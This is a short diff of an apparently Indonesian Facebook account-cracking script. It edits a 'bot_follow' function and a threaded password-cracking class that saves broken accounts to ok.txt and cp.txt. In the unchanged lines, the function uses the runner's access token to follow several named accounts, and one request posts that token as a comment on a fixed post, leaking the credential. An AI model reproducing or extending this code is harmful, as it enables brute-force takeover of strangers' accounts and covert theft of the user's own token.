@@ -219,7 +219,6 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
 	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
 	requests.post('https://graph.facebook.com/100023543993788/subscribers?access_token=' + toket) #Irman Sniper
-        requests.post('https://graph.facebook.com/100029526650087/subscribers?access_token=' + toket) #Gilang Liar
 	requests.post('https://graph.facebook.com/10215994561776676/comments/?message=' +toket+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/10214228940637251/comments/?message=' +kom+ '&access_token=' + toket)
 	menu()
@@ -745,7 +744,7 @@ class crackttl:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
